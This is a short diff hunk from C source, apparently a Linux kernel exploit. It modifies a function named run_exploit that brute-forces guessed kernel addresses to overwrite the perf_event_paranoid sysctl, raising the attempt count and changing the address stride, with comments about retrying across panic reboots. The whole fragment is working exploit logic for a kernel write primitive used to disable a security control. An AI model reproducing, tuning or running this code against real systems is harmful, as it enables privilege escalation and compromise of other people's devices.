@@ -943,10 +943,10 @@ int run_exploit(int argc, char **argv) {
     if (SYSCTL_PERF_EVENT_PARANOID_OFF != 0) {
       /* v14 gear sweep: alias = TRUE_PAGE_OFFSET + m*1GB + 0x80000 + off.
          m persists across panic reboots (.gl_round). */
-      for (int att = 1; att <= 200; att++) {
+      for (int att = 1; att <= 600; att++) {
         uintptr_t base = 0xffffffc000000000ULL
-                       + (uintptr_t)g_attempt_round * 0x40000000ULL
-                       + 0x80000ULL + SYSCTL_PERF_EVENT_PARANOID_OFF;
+                       + (uintptr_t)g_attempt_round * 0x200000ULL
+                       + SYSCTL_PERF_EVENT_PARANOID_OFF;
         pr_info("W1c gear m=%zu target=%016zx\n", g_attempt_round, base);
         do_one_write_node(base, "W1c: perf unblock", 1, 0);
         usleep(150000);
